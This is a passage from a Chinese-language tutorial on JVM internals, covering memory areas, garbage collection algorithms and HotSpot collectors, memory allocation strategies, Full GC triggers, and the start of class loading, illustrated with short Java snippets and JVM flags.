Java 方法在执行的同时会创建一个栈帧用于存储局部变量表、操作数栈、常量池引用等信息。从方法调用直至执行完成的过程，就对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/ff5b89ac-798e-4fbc-b0ce-da2fc2358570.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/ff5b89ac-798e-4fbc-b0ce-da2fc2358570.jpg" alt="img"></a></p><p>可以通过 -Xss 这个虚拟机参数来指定每个线程的 Java 虚拟机栈内存大小：</p><pre><code>java -Xss512M HackTheJava</code></pre><p>该区域可能抛出以下异常：</p><ul><li>当线程请求的栈深度超过最大值，会抛出 StackOverflowError 异常；</li><li>栈进行动态扩展时如果无法申请到足够内存，会抛出 OutOfMemoryError 异常。</li></ul><h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p>本地方法栈与 Java 虚拟机栈类似，它们之间的区别只不过是本地方法栈为本地方法服务。</p><p>本地方法一般是用其它语言（C、C++ 或汇编语言等）编写的，并且被编译为基于本机硬件和操作系统的程序，对待这些方法需要特别处理。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/1_2001550547261811.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/1_2001550547261811.png" alt="img"></a></p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>所有对象都在这里分配内存，是垃圾收集的主要区域（”GC 堆”）。</p><p>现代的垃圾收集器基本都是采用分代收集算法，其主要的思想是针对不同类型的对象采取不同的垃圾回收算法，可以将堆分成两块：</p><ul><li>新生代（Young Generation）</li><li>老年代（Old Generation）</li></ul><p>堆不需要连续内存，并且可以动态增加其内存，增加失败会抛出 OutOfMemoryError 异常。</p><p>可以通过 -Xms 和 -Xmx 两个虚拟机参数来指定一个程序的堆内存大小，第一个参数设置初始值，第二个参数设置最大值。</p><pre class=" language-shell"><code class="language-shell">java -Xms1M -Xmx2M HackTheJava</code></pre><h2 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h2><p>用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。</p><p>和堆一样不需要连续的内存，并且可以动态扩展，动态扩展失败一样会抛出 OutOfMemoryError 异常。</p><p>对这块区域进行垃圾回收的主要目标是对常量池的回收和对类的卸载，但是一般比较难实现。</p><p>HotSpot 虚拟机把它当成永久代来进行垃圾回收。但是很难确定永久代的大小，因为它受到很多因素影响，并且每次 Full GC 之后永久代的大小都会改变，所以经常会抛出 OutOfMemoryError 异常。为了更容易管理方法区，从 JDK 1.8 开始，移除永久代，并把方法区移至元空间，它位于本地内存中，而不是虚拟机内存中。</p><h2 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h2><p>运行时常量池是方法区的一部分。</p><p>Class 文件中的常量池（编译器生成的各种字面量和符号引用）会在类加载后被放入这个区域。</p><p>除了在编译期生成的常量，还允许动态生成，例如 String 类的 intern()。</p><h2 id="直接内存"><a href="#直接内存" class="headerlink" title="直接内存"></a>直接内存</h2><p>在 JDK 1.4 中新加入了 NIO 类，它可以使用 Native 函数库直接分配堆外内存（Native 堆），然后通过一个存储在 Java 堆里的 DirectByteBuffer 对象作为这块内存的引用进行操作。</p><p>这样能在一些场景中显著提高性能，因为避免了在 Java 堆和 Native 堆中来回复制数据。</p><h1 id="二、垃圾收集"><a href="#二、垃圾收集" class="headerlink" title="二、垃圾收集"></a>二、垃圾收集</h1><p>垃圾收集主要是针对堆和方法区进行。</p><p>程序计数器、虚拟机栈和本地方法栈这三个区域属于线程私有的，只存在于线程的生命周期内，线程结束之后也会消失，因此不需要对这三个区域进行垃圾回收。</p><h2 id="判断一个对象是否可被回收"><a href="#判断一个对象是否可被回收" class="headerlink" title="判断一个对象是否可被回收"></a>判断一个对象是否可被回收</h2><h3 id="1-引用计数算法"><a href="#1-引用计数算法" class="headerlink" title="1. 引用计数算法"></a>1. 引用计数算法</h3><p>给对象添加一个引用计数器，当对象增加一个引用时计数器加 1，引用失效时计数器减 1。引用计数为 0 的对象可被回收。</p><p>两个对象出现循环引用的情况下，此时引用计数器永远不为 0，导致无法对它们进行回收。</p><p>正因为循环引用的存在，因此 Java 虚拟机不使用引用计数算法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReferenceCountingGC</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Object instance <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ReferenceCountingGC objectA <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceCountingGC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ReferenceCountingGC objectB <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceCountingGC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectA<span class="token punctuation">.</span>instance <span class="token operator">=</span> objectB<span class="token punctuation">;</span>        objectB<span class="token punctuation">.</span>instance <span class="token operator">=</span> objectA<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="2-可达性分析算法"><a href="#2-可达性分析算法" class="headerlink" title="2. 可达性分析算法"></a>2. 可达性分析算法</h3><p>通过 GC Roots 作为起始点进行搜索，能够到达到的对象都是存活的，不可达的对象可被回收。</p><p>Java 虚拟机使用该算法来判断对象是否可被回收，在 Java 中 GC Roots 一般包含以下内容：</p><ul><li>虚拟机栈中局部变量表中引用的对象</li><li>本地方法栈中 JNI 中引用的对象</li><li>方法区中类静态属性引用的对象</li><li>方法区中的常量引用的对象</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/0635cbe8.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/0635cbe8.png" alt="img"></a></p><h3 id="3-方法区的回收"><a href="#3-方法区的回收" class="headerlink" title="3. 方法区的回收"></a>3. 方法区的回收</h3><p>因为方法区主要存放永久代对象，而永久代对象的回收率比新生代低很多，因此在方法区上进行回收性价比不高。</p><p>主要是对常量池的回收和对类的卸载。</p><p>在大量使用反射、动态代理、CGLib 等 ByteCode 框架、动态生成 JSP 以及 OSGi 这类频繁自定义 ClassLoader 的场景都需要虚拟机具备类卸载功能，以保证不会出现内存溢出。</p><p>类的卸载条件很多，需要满足以下三个条件，并且满足了也不一定会被卸载：</p><ul><li>该类所有的实例都已经被回收，也就是堆中不存在该类的任何实例。</li><li>加载该类的 ClassLoader 已经被回收。</li><li>该类对应的 Class 对象没有在任何地方被引用，也就无法在任何地方通过反射访问该类方法。</li></ul><p>可以通过 -Xnoclassgc 参数来控制是否对类进行卸载。</p><h3 id="4-finalize"><a href="#4-finalize" class="headerlink" title="4. finalize()"></a>4. finalize()</h3><p>finalize() 类似 C++ 的析构函数，用来做关闭外部资源等工作。但是 try-finally 等方式可以做的更好，并且该方法运行代价高昂，不确定性大，无法保证各个对象的调用顺序，因此最好不要使用。</p><p>当一个对象可被回收时，如果需要执行该对象的 finalize() 方法，那么就有可能在该方法中让对象重新被引用，从而实现自救。自救只能进行一次，如果回收的对象之前调用了 finalize() 方法自救，后面回收时不会调用 finalize() 方法。</p><h2 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h2><p>无论是通过引用计数算法判断对象的引用数量，还是通过可达性分析算法判断对象是否可达，判定对象是否可被回收都与引用有关。</p><p>Java 提供了四种强度不同的引用类型。</p><h3 id="1-强引用"><a href="#1-强引用" class="headerlink" title="1. 强引用"></a>1. 强引用</h3><p>被强引用关联的对象不会被回收。</p><p>使用 new 一个新对象的方式来创建强引用。</p><pre class=" language-java"><code class="language-java">Object obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-软引用"><a href="#2-软引用" class="headerlink" title="2. 软引用"></a>2. 软引用</h3><p>被软引用关联的对象只有在内存不够的情况下才会被回收。</p><p>使用 SoftReference 类来创建软引用。</p><pre class=" language-java"><code class="language-java">Object obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>SoftReference<span class="token operator">&lt;</span>Object<span class="token operator">></span> sf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoftReference</span><span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>obj <span class="token operator">=</span> null<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 使对象只被软引用关联</span></code></pre><h3 id="3-弱引用"><a href="#3-弱引用" class="headerlink" title="3. 弱引用"></a>3. 弱引用</h3><p>被弱引用关联的对象一定会被回收，也就是说它只能存活到下一次垃圾回收发生之前。</p><p>使用 WeakReference 类来实现弱引用。</p><pre class=" language-java"><code class="language-java">Object obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>WeakReference<span class="token operator">&lt;</span>Object<span class="token operator">></span> wf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakReference</span><span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>obj <span class="token operator">=</span> null<span class="token punctuation">;</span></code></pre><h3 id="4-虚引用"><a href="#4-虚引用" class="headerlink" title="4. 虚引用"></a>4. 虚引用</h3><p>又称为幽灵引用或者幻影引用。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用取得一个对象。</p><p>为一个对象设置虚引用关联的唯一目的就是能在这个对象被回收时收到一个系统通知。</p><p>使用 PhantomReference 来实现虚引用。</p><pre class=" language-java"><code class="language-java">Object obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>PhantomReference<span class="token operator">&lt;</span>Object<span class="token operator">></span> pf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PhantomReference</span><span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>obj <span class="token operator">=</span> null<span class="token punctuation">;</span></code></pre><h2 id="垃圾收集算法"><a href="#垃圾收集算法" class="headerlink" title="垃圾收集算法"></a>垃圾收集算法</h2><h3 id="1-标记-清除"><a href="#1-标记-清除" class="headerlink" title="1. 标记 - 清除"></a>1. 标记 - 清除</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/a4248c4b-6c1d-4fb8-a557-86da92d3a294.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/a4248c4b-6c1d-4fb8-a557-86da92d3a294.jpg" alt="img"></a></p><p>标记要回收的对象，然后清除。</p><p>不足：</p><ul><li>标记和清除过程效率都不高；</li><li>会产生大量不连续的内存碎片，导致无法给大对象分配内存。</li></ul><h3 id="2-标记-整理"><a href="#2-标记-整理" class="headerlink" title="2. 标记 - 整理"></a>2. 标记 - 整理</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/902b83ab-8054-4bd2-898f-9a4a0fe52830.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/902b83ab-8054-4bd2-898f-9a4a0fe52830.jpg" alt="img"></a></p><p>让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。</p><h3 id="3-复制"><a href="#3-复制" class="headerlink" title="3. 复制"></a>3. 复制</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/e6b733ad-606d-4028-b3e8-83c3a73a3797.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/e6b733ad-606d-4028-b3e8-83c3a73a3797.jpg" alt="img"></a></p><p>将内存划分为大小相等的两块，每次只使用其中一块，当这一块内存用完了就将还存活的对象复制到另一块上面，然后再把使用过的内存空间进行一次清理。</p><p>主要不足是只使用了内存的一半。</p><p>现在的商业虚拟机都采用这种收集算法来回收新生代，但是并不是将新生代划分为大小相等的两块，而是分为一块较大的 Eden 空间和两块较小的 Survivor 空间，每次使用 Eden 空间和其中一块 Survivor。在回收时，将 Eden 和 Survivor 中还存活着的对象一次性复制到另一块 Survivor 空间上，最后清理 Eden 和使用过的那一块 Survivor。</p><p>HotSpot 虚拟机的 Eden 和 Survivor 的大小比例默认为 8:1，保证了内存的利用率达到 90%。如果每次回收有多于 10% 的对象存活，那么一块 Survivor 空间就不够用了，此时需要依赖于老年代进行分配担保，也就是借用老年代的空间存储放不下的对象。</p><h3 id="4-分代收集"><a href="#4-分代收集" class="headerlink" title="4. 分代收集"></a>4. 分代收集</h3><p>现在的商业虚拟机采用分代收集算法，它根据对象存活周期将内存划分为几块，不同块采用适当的收集算法。</p><p>一般将堆分为新生代和老年代。</p><ul><li>新生代使用：复制算法</li><li>老年代使用：标记 - 清除 或者 标记 - 整理 算法</li></ul><h2 id="垃圾收集器"><a href="#垃圾收集器" class="headerlink" title="垃圾收集器"></a>垃圾收集器</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c625baa0-dde6-449e-93df-c3a67f2f430f.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c625baa0-dde6-449e-93df-c3a67f2f430f.jpg" alt="img"></a></p><p>以上是 HotSpot 虚拟机中的 7 个垃圾收集器，连线表示垃圾收集器可以配合使用。</p><ul><li>单线程与多线程：单线程指的是垃圾收集器只使用一个线程进行收集，而多线程使用多个线程；</li><li>串行与并行：串行指的是垃圾收集器与用户程序交替执行，这意味着在执行垃圾收集的时候需要停顿用户程序；并行指的是垃圾收集器和用户程序同时执行。除了 CMS 和 G1 之外，其它垃圾收集器都是以串行的方式执行。</li></ul><h3 id="1-Serial-收集器"><a href="#1-Serial-收集器" class="headerlink" title="1. Serial 收集器"></a>1. Serial 收集器</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/22fda4ae-4dd5-489d-ab10-9ebfdad22ae0.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/22fda4ae-4dd5-489d-ab10-9ebfdad22ae0.jpg" alt="img"></a></p><p>Serial 翻译为串行，也就是说它以串行的方式执行。</p><p>它是单线程的收集器，只会使用一个线程进行垃圾收集工作。</p><p>它的优点是简单高效，对于单个 CPU 环境来说，由于没有线程交互的开销，因此拥有最高的单线程收集效率。</p><p>它是 Client 模式下的默认新生代收集器，因为在该应用场景下，分配给虚拟机管理的内存一般来说不会很大。Serial 收集器收集几十兆甚至一两百兆的新生代停顿时间可以控制在一百多毫秒以内，只要不是太频繁，这点停顿是可以接受的。</p><h3 id="2-ParNew-收集器"><a href="#2-ParNew-收集器" class="headerlink" title="2. ParNew 收集器"></a>2. ParNew 收集器</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/81538cd5-1bcf-4e31-86e5-e198df1e013b.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/81538cd5-1bcf-4e31-86e5-e198df1e013b.jpg" alt="img"></a></p><p>它是 Serial 收集器的多线程版本。</p><p>是 Server 模式下的虚拟机首选新生代收集器，除了性能原因外，主要是因为除了 Serial 收集器，只有它能与 CMS 收集器配合工作。</p><p>默认开启的线程数量与 CPU 数量相同，可以使用 -XX:ParallelGCThreads 参数来设置线程数。</p><h3 id="3-Parallel-Scavenge-收集器"><a href="#3-Parallel-Scavenge-收集器" class="headerlink" title="3. Parallel Scavenge 收集器"></a>3. Parallel Scavenge 收集器</h3><p>与 ParNew 一样是多线程收集器。</p><p>其它收集器关注点是尽可能缩短垃圾收集时用户线程的停顿时间，而它的目标是达到一个可控制的吞吐量，它被称为“吞吐量优先”收集器。这里的吞吐量指 CPU 用于运行用户代码的时间占总时间的比值。</p><p>停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验。而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，适合在后台运算而不需要太多交互的任务。</p><p>缩短停顿时间是以牺牲吞吐量和新生代空间来换取的：新生代空间变小，垃圾回收变得频繁，导致吞吐量下降。</p><p>可以通过一个开关参数打开 GC 自适应的调节策略（GC Ergonomics），就不需要手工指定新生代的大小（-Xmn）、Eden 和 Survivor 区的比例、晋升老年代对象年龄等细节参数了。虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量。</p><h3 id="4-Serial-Old-收集器"><a href="#4-Serial-Old-收集器" class="headerlink" title="4. Serial Old 收集器"></a>4. Serial Old 收集器</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/08f32fd3-f736-4a67-81ca-295b2a7972f2.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/08f32fd3-f736-4a67-81ca-295b2a7972f2.jpg" alt="img"></a></p><p>是 Serial 收集器的老年代版本，也是给 Client 模式下的虚拟机使用。如果用在 Server 模式下，它有两大用途：</p><ul><li>在 JDK 1.5 以及之前版本（Parallel Old 诞生以前）中与 Parallel Scavenge 收集器搭配使用。</li><li>作为 CMS 收集器的后备预案，在并发收集发生 Concurrent Mode Failure 时使用。</li></ul><h3 id="5-Parallel-Old-收集器"><a href="#5-Parallel-Old-收集器" class="headerlink" title="5. Parallel Old 收集器"></a>5. Parallel Old 收集器</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/278fe431-af88-4a95-a895-9c3b80117de3.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/278fe431-af88-4a95-a895-9c3b80117de3.jpg" alt="img"></a></p><p>是 Parallel Scavenge 收集器的老年代版本。</p><p>在注重吞吐量以及 CPU 资源敏感的场合，都可以优先考虑 Parallel Scavenge 加 Parallel Old 收集器。</p><h3 id="6-CMS-收集器"><a href="#6-CMS-收集器" class="headerlink" title="6. CMS 收集器"></a>6. CMS 收集器</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/62e77997-6957-4b68-8d12-bfd609bb2c68.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/62e77997-6957-4b68-8d12-bfd609bb2c68.jpg" alt="img"></a></p><p>CMS（Concurrent Mark Sweep），Mark Sweep 指的是标记 - 清除算法。</p><p>分为以下四个流程：</p><ul><li>初始标记：仅仅只是标记一下 GC Roots 能直接关联到的对象，速度很快，需要停顿。</li><li>并发标记：进行 GC Roots Tracing 的过程，它在整个回收过程中耗时最长，不需要停顿。</li><li>重新标记：为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，需要停顿。</li><li>并发清除：不需要停顿。</li></ul><p>在整个过程中耗时最长的并发标记和并发清除过程中，收集器线程都可以与用户线程一起工作，不需要进行停顿。</p><p>具有以下缺点：</p><ul><li>吞吐量低：低停顿时间是以牺牲吞吐量为代价的，导致 CPU 利用率不够高。</li><li>无法处理浮动垃圾，可能出现 Concurrent Mode Failure。浮动垃圾是指并发清除阶段由于用户线程继续运行而产生的垃圾，这部分垃圾只能到下一次 GC 时才能进行回收。由于浮动垃圾的存在，因此需要预留出一部分内存，意味着 CMS 收集不能像其它收集器那样等待老年代快满的时候再回收。如果预留的内存不够存放浮动垃圾，就会出现 Concurrent Mode Failure，这时虚拟机将临时启用 Serial Old 来替代 CMS。</li><li>标记 - 清除算法导致的空间碎片，往往出现老年代空间剩余，但无法找到足够大连续空间来分配当前对象，不得不提前触发一次 Full GC。</li></ul><h3 id="7-G1-收集器"><a href="#7-G1-收集器" class="headerlink" title="7. G1 收集器"></a>7. G1 收集器</h3><p>G1（Garbage-First），它是一款面向服务端应用的垃圾收集器，在多 CPU 和大内存的场景下有很好的性能。HotSpot 开发团队赋予它的使命是未来可以替换掉 CMS 收集器。</p><p>堆被分为新生代和老年代，其它收集器进行收集的范围都是整个新生代或者老年代，而 G1 可以直接对新生代和老年代一起回收。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/4cf711a8-7ab2-4152-b85c-d5c226733807.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/4cf711a8-7ab2-4152-b85c-d5c226733807.png" alt="img"></a></p><p>G1 把堆划分成多个大小相等的独立区域（Region），新生代和老年代不再物理隔离。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/9bbddeeb-e939-41f0-8e8e-2b1a0aa7e0a7.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/9bbddeeb-e939-41f0-8e8e-2b1a0aa7e0a7.png" alt="img"></a></p><p>通过引入 Region 的概念，从而将原来的一整块内存空间划分成多个的小空间，使得每个小空间可以单独进行垃圾回收。这种划分方法带来了很大的灵活性，使得可预测的停顿时间模型成为可能。通过记录每个 Region 垃圾回收时间以及回收所获得的空间（这两个值是通过过去回收的经验获得），并维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的 Region。</p><p>每个 Region 都有一个 Remembered Set，用来记录该 Region 对象的引用对象所在的 Region。通过使用 Remembered Set，在做可达性分析的时候就可以避免全堆扫描。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/f99ee771-c56f-47fb-9148-c0036695b5fe.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/f99ee771-c56f-47fb-9148-c0036695b5fe.jpg" alt="img"></a></p><p>如果不计算维护 Remembered Set 的操作，G1 收集器的运作大致可划分为以下几个步骤：</p><ul><li>初始标记</li><li>并发标记</li><li>最终标记：为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程的 Remembered Set Logs 里面，最终标记阶段需要把 Remembered Set Logs 的数据合并到 Remembered Set 中。这阶段需要停顿线程，但是可并行执行。</li><li>筛选回收：首先对各个 Region 中的回收价值和成本进行排序，根据用户所期望的 GC 停顿时间来制定回收计划。此阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分 Region，时间是用户可控制的，而且停顿用户线程将大幅度提高收集效率。</li></ul><p>具备如下特点：</p><ul><li>空间整合：整体来看是基于“标记 - 整理”算法实现的收集器，从局部（两个 Region 之间）上来看是基于“复制”算法实现的，这意味着运行期间不会产生内存空间碎片。</li><li>可预测的停顿：能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在 GC 上的时间不得超过 N 毫秒。</li></ul><h1 id="三、内存分配与回收策略"><a href="#三、内存分配与回收策略" class="headerlink" title="三、内存分配与回收策略"></a>三、内存分配与回收策略</h1><h2 id="Minor-GC-和-Full-GC"><a href="#Minor-GC-和-Full-GC" class="headerlink" title="Minor GC 和 Full GC"></a>Minor GC 和 Full GC</h2><ul><li>Minor GC：发生在新生代上，因为新生代对象存活时间很短，因此 Minor GC 会频繁执行，执行的速度一般也会比较快。</li><li>Full GC：发生在老年代上，老年代对象其存活时间长，因此 Full GC 很少执行，执行速度会比 Minor GC 慢很多。</li></ul><h2 id="内存分配策略"><a href="#内存分配策略" class="headerlink" title="内存分配策略"></a>内存分配策略</h2><h3 id="1-对象优先在-Eden-分配"><a href="#1-对象优先在-Eden-分配" class="headerlink" title="1. 对象优先在 Eden 分配"></a>1. 对象优先在 Eden 分配</h3><p>大多数情况下，对象在新生代 Eden 区分配，当 Eden 区空间不够时，发起 Minor GC。</p><h3 id="2-大对象直接进入老年代"><a href="#2-大对象直接进入老年代" class="headerlink" title="2. 大对象直接进入老年代"></a>2. 大对象直接进入老年代</h3><p>大对象是指需要连续内存空间的对象，最典型的大对象是那种很长的字符串以及数组。</p><p>经常出现大对象会提前触发垃圾收集以获取足够的连续空间分配给大对象。</p><p>-XX:PretenureSizeThreshold，大于此值的对象直接在老年代分配，避免在 Eden 区和 Survivor 区之间的大量内存复制。</p><h3 id="3-长期存活的对象进入老年代"><a href="#3-长期存活的对象进入老年代" class="headerlink" title="3. 长期存活的对象进入老年代"></a>3. 长期存活的对象进入老年代</h3><p>为对象定义年龄计数器，对象在 Eden 出生并经过 Minor GC 依然存活，将移动到 Survivor 中，年龄就增加 1 岁，增加到一定年龄则移动到老年代中。</p><p>-XX:MaxTenuringThreshold 用来定义年龄的阈值。</p><h3 id="4-动态对象年龄判定"><a href="#4-动态对象年龄判定" class="headerlink" title="4. 动态对象年龄判定"></a>4. 动态对象年龄判定</h3><p>虚拟机并不是永远地要求对象的年龄必须达到 MaxTenuringThreshold 才能晋升老年代，如果在 Survivor 中相同年龄所有对象大小的总和大于 Survivor 空间的一半，则年龄大于或等于该年龄的对象可以直接进入老年代，无需等到 MaxTenuringThreshold 中要求的年龄。</p><h3 id="5-空间分配担保"><a href="#5-空间分配担保" class="headerlink" title="5. 空间分配担保"></a>5. 空间分配担保</h3><p>在发生 Minor GC 之前，虚拟机先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果条件成立的话，那么 Minor GC 可以确认是安全的。</p><p>如果不成立的话虚拟机会查看 HandlePromotionFailure 设置值是否允许担保失败，如果允许那么就会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次 Minor GC；如果小于，或者 HandlePromotionFailure 设置不允许冒险，那么就要进行一次 Full GC。</p><h2 id="Full-GC-的触发条件"><a href="#Full-GC-的触发条件" class="headerlink" title="Full GC 的触发条件"></a>Full GC 的触发条件</h2><p>对于 Minor GC，其触发条件非常简单，当 Eden 空间满时，就将触发一次 Minor GC。而 Full GC 则相对复杂，有以下条件：</p><h3 id="1-调用-System-gc"><a href="#1-调用-System-gc" class="headerlink" title="1. 调用 System.gc()"></a>1. 调用 System.gc()</h3><p>只是建议虚拟机执行 Full GC，但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。</p><h3 id="2-老年代空间不足"><a href="#2-老年代空间不足" class="headerlink" title="2. 老年代空间不足"></a>2. 老年代空间不足</h3><p>老年代空间不足的常见场景为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。</p><p>为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过 -Xmn 虚拟机参数调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。还可以通过 -XX:MaxTenuringThreshold 调大对象进入老年代的年龄，让对象在新生代多存活一段时间。</p><h3 id="3-空间分配担保失败"><a href="#3-空间分配担保失败" class="headerlink" title="3. 空间分配担保失败"></a>3. 空间分配担保失败</h3><p>使用复制算法的 Minor GC 需要老年代的内存空间作担保，如果担保失败会执行一次 Full GC。具体内容请参考上面的第五小节。</p><h3 id="4-JDK-1-7-及以前的永久代空间不足"><a href="#4-JDK-1-7-及以前的永久代空间不足" class="headerlink" title="4. JDK 1.7 及以前的永久代空间不足"></a>4. JDK 1.7 及以前的永久代空间不足</h3><p>在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些 Class 的信息、常量、静态变量等数据。</p><p>当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用 CMS GC 的情况下也会执行 Full GC。如果经过 Full GC 仍然回收不了，那么虚拟机会抛出 java.lang.OutOfMemoryError。</p><p>为避免以上原因引起的 Full GC，可采用的方法为增大永久代空间或转为使用 CMS GC。</p><h3 id="5-Concurrent-Mode-Failure"><a href="#5-Concurrent-Mode-Failure" class="headerlink" title="5. Concurrent Mode Failure"></a>5. Concurrent Mode Failure</h3><p>执行 CMS GC 的过程中同时有对象要放入老年代，而此时老年代空间不足（可能是 GC 过程中浮动垃圾过多导致暂时性的空间不足），便会报 Concurrent Mode Failure 错误，并触发 Full GC。</p><h1 id="四、类加载机制"><a href="#四、类加载机制" class="headerlink" title="四、类加载机制"></a>四、类加载机制</h1><p>类是在运行期间第一次使用时动态加载的，而不是编译时期一次性加载。因为如果在编译时期一次性加载，那么会占用很多的内存。</p><h2 id="类的生命周期"><a href="#类的生命周期" class="headerlink" title="类的生命周期"></a>类的生命周期</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/32b8374a-e822-4720-af0b-c0f485095ea2.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/32b8374a-e822-4720-af0b-c0f485095ea2.jpg" alt="img"></a></p><p>包括以下 7 个阶段：</p><ul><li><strong>加载（Loading）</strong></li><li><strong>验证（Verification）</strong></li><li><strong>准备（Preparation）</strong></li><li><strong>解析（Resolution）</strong></li><li><strong>初始化（Initialization）</strong></li><li>使用（Using）</li><li>卸载（Unloading）</li></ul><p><strong>注意</strong>：加载、验证、准备、初始化和卸载这5个阶段的顺序是确定的，类的加载过程必须按照这种顺序按部就班地<strong>开始</strong>，强调开始是因为这些阶段通常都是<strong>相互交叉地混合式进行的</strong>，通常在一个阶段执行的过程中调用另一个阶段（比如加载阶段需要验证字节码，这就需要调用验证阶段，即加载阶段还没有结束，但是验证阶段已经开始），但是两个阶段的开始时间仍然保持着固定的先后顺序。</p><h2 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h2><p>包含了加载、验证、准备、解析和初始化这 5 